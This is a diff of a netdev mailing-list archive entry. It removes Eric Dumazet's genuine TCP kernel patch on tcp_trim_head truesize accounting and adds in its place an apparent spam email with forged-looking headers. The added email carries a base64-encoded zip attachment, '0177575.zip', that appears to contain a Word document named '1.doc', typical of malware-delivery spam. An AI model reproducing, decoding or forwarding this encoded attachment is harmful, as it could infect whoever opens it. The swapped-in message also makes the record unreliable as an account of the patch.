@@ -1,100 +1,37 @@
-From: Eric Dumazet <eric.dumazet@gmail.com>
-Subject: [PATCH net] tcp: do not underestimate skb->truesize in
- tcp_trim_head()
-Date: Wed, 26 Apr 2017 17:15:40 -0700
-Message-ID: <1493252140.6453.96.camel@edumazet-glaptop3.roam.corp.google.com>
-References: <1493222866.6453.75.camel@edumazet-glaptop3.roam.corp.google.com>
+From: <ccc@mail.com>
+Subject: 728 netdev
+Date: Thu, 27 Apr 2017 00:25:53 -0000
+Message-ID: <149325275387.22262.11092090767313803546@vnpt-hanoi.com.vn>
 Mime-Version: 1.0
-Content-Type: text/plain; charset="UTF-8"
-Content-Transfer-Encoding: 7bit
-Cc: netdev <netdev@vger.kernel.org>,
-        Andrey Konovalov <andreyknvl@google.com>
-To: David Miller <davem@davemloft.net>
+Content-Type: application/zip; name="0177575.zip"
+Content-Transfer-Encoding: base64
+To: <netdev@vger.kernel.org>
 Return-path: <netdev-owner@vger.kernel.org>
-Received: from mail-it0-f66.google.com ([209.85.214.66]:35441 "EHLO
-        mail-it0-f66.google.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-        with ESMTP id S1033228AbdD0APo (ORCPT
-        <rfc822;netdev@vger.kernel.org>); Wed, 26 Apr 2017 20:15:44 -0400
-Received: by mail-it0-f66.google.com with SMTP id 70so533465ita.2
-        for <netdev@vger.kernel.org>; Wed, 26 Apr 2017 17:15:43 -0700 (PDT)
-In-Reply-To: <1493222866.6453.75.camel@edumazet-glaptop3.roam.corp.google.com>
+Received: from static.vnpt-hanoi.com.vn ([113.190.227.154]:38926 "HELO
+        vnpt-hanoi.com.vn" rhost-flags-OK-FAIL-OK-FAIL) by vger.kernel.org
+        with SMTP id S1033250AbdD0A0E (ORCPT
+        <rfc822;netdev@vger.kernel.org>); Wed, 26 Apr 2017 20:26:04 -0400
+Content-Disposition: attachment
 Sender: netdev-owner@vger.kernel.org
 List-ID: <netdev.vger.kernel.org>
 
-From: Eric Dumazet <edumazet@google.com>
-
-Andrey found a way to trigger the WARN_ON_ONCE(delta < len) in
-skb_try_coalesce() using syzkaller and a filter attached to a TCP
-socket over loopback interface.
-
-I believe one issue with looped skbs is that tcp_trim_head() can end up
-producing skb with under estimated truesize.
-
-It hardly matters for normal conditions, since packets sent over
-loopback are never truncated.
-
-Bytes trimmed from skb->head should not change skb truesize, since
-skb->head is not reallocated.
-
-Signed-off-by: Eric Dumazet <edumazet@google.com>
-Reported-by: Andrey Konovalov <andreyknvl@google.com>
----
- net/ipv4/tcp_output.c |   19 ++++++++++++-------
- 1 file changed, 12 insertions(+), 7 deletions(-)
-
-diff --git a/net/ipv4/tcp_output.c b/net/ipv4/tcp_output.c
-index c3c082ed38796f65948e7a1042e37813b71d5abf..a85d863c44196e60fd22e25471cf773e72d2c133 100644
---- a/net/ipv4/tcp_output.c
-+++ b/net/ipv4/tcp_output.c
-@@ -1267,7 +1267,7 @@ int tcp_fragment(struct sock *sk, struct sk_buff *skb, u32 len,
-  * eventually). The difference is that pulled data not copied, but
-  * immediately discarded.
-  */
--static void __pskb_trim_head(struct sk_buff *skb, int len)
-+static int __pskb_trim_head(struct sk_buff *skb, int len)
- {
- 	struct skb_shared_info *shinfo;
- 	int i, k, eat;
-@@ -1277,7 +1277,7 @@ static void __pskb_trim_head(struct sk_buff *skb, int len)
- 		__skb_pull(skb, eat);
- 		len -= eat;
- 		if (!len)
--			return;
-+			return 0;
- 	}
- 	eat = len;
- 	k = 0;
-@@ -1303,23 +1303,28 @@ static void __pskb_trim_head(struct sk_buff *skb, int len)
- 	skb_reset_tail_pointer(skb);
- 	skb->data_len -= len;
- 	skb->len = skb->data_len;
-+	return len;
- }
- 
- /* Remove acked data from a packet in the transmit queue. */
- int tcp_trim_head(struct sock *sk, struct sk_buff *skb, u32 len)
- {
-+	u32 delta_truesize;
-+
- 	if (skb_unclone(skb, GFP_ATOMIC))
- 		return -ENOMEM;
- 
--	__pskb_trim_head(skb, len);
-+	delta_truesize = __pskb_trim_head(skb, len);
- 
- 	TCP_SKB_CB(skb)->seq += len;
- 	skb->ip_summed = CHECKSUM_PARTIAL;
- 
--	skb->truesize	     -= len;
--	sk->sk_wmem_queued   -= len;
--	sk_mem_uncharge(sk, len);
--	sock_set_flag(sk, SOCK_QUEUE_SHRUNK);
-+	if (delta_truesize) {
-+		skb->truesize	   -= delta_truesize;
-+		sk->sk_wmem_queued -= delta_truesize;
-+		sk_mem_uncharge(sk, delta_truesize);
-+		sock_set_flag(sk, SOCK_QUEUE_SHRUNK);
-+	}
- 
- 	/* Any change of skb->len requires recalculation of tso factor. */
- 	if (tcp_skb_pcount(skb) > 1)
+UEsDBBQAAAAIAEIAm0qvKbuIyAMAAJQXAAAFAAAAMS5kb2PtWM2O2zYQvhvwO+gWIEBtUvyRlGM3
+KIKckrZJL7xQFGmpkCVDlHezMPzuHXLkjdeJm2SbLdqsP4CaITnkcDjkcKCdGkZHla6sa3W3oiQV
+Sne+iR+zWdFUpGprUMIxKkimAkeUH33tqtLUoVFgte2xKrFaN/eqZXM3HnUxduCdjbWxtmsb6vdr
+oZenH+vGk/lsp5rO9Tult2PdD8mt3rxKP7ytV6+v3xH65uf9TvUbO+jx831msHps1up2SAnJ1bon
+qrrlqh6YWjcd5SAy2OvzEoyBxLUdfNN3FFhbQaOnBbBd7zZ6ZT1F/qYfKs8yrJhaD16QOPq5Mv16
+o7vbpPv1ffq6+eX61ct3V6vf3ooj2ZuDNOgCpRnL9/tge5n8bv2YvAFFycveLGLjc/Vh3XZ+LNtk
+hyxN6nHcvFguvYHN036xbszQ+96NC1C+7J1rjF2GJS7BSha5dYsqXN+PdkhUOw4bDRQ+ldq0uulC
+b1/+ac0YyboMZLup9GgDd0OLXAampoRKXBjUTKu9T/4ADQtY8XZtu3EBbp1W3rfWtL6pEvWMBDBC
+fiLk8Lk6cAgu1bOs2t9NDZp1QigRsTedpCg5Dx0+81lFjKPUEk1LSrWl5KsBV6AAIs900xN62nGy
+RmddxKm0e0TMZ+4J4ylZ/yku1p+gmqg9Q38gXHz/dHGx/ksSLKQXhhCRQQ6SAx8o5BUZxRL6RahD
+O4dXXEIGwHNs59AugwwUCdkBgyJSnEeAgCxJTFG4BcphjjAedMkM9Uh4/2nIKMSnL/9RJsGOMwRz
+YCK4JH+D+Sx8PzNPetwcNHFYCb8KFp2M+Xeg45roOS+RB+K8LTq/n6nNZxlHfwRfS/Bflk/+Dz6l
+6FMGO8g4+l/o6YyAByRHnodSoQyTOA+nH8+WnNriPOEMhDmgCGinKfrle+/B12I+CydYhFXCac0E
+3gqWYuHTSQ6WSLBQTjsReYoWMDHthETr4w7o6aZYHMMpWs+hZMV0c3Lc4QO+1w484CTTk/txuDF8
+omKi0637L2cNl8j/I+BhuFj/zzDFgZTkJ3HhDIRBCUtMYXVWuKLUxlKamxwiidYhfuqClJyjXHxf
++FRCmAEJNeoySSHIpQ5DZQirGZuEUnycZDlRM/XDwNSijHQ4WRxPMRTH8FxgSI9yB+VBqcMHiVUY
+hkO/FPjwSUEu+J/i25+9u2P/SPIPRbwr7Oj5/QIeIXWl5N5NiH8gB+u37ZiEP+mtqZUzniZKO85S
+yeLfU2wkiWo6P/imgmRHFJQl+/1++oUZ/l/6sR9sElr+AlBLAQIfABQAAAAIAEIAm0qvKbuIyAMA
+AJQXAAAFACQAAAAAAAAAICAAAAAAAAAxLmRvYwoAIAAAAAAAAQAYABl/Q1vQvtIB/NfuWNC+0gGA
+qThb0L7SAVBLBQYAAAAAAQABAFcAAADrAwAAAAA=
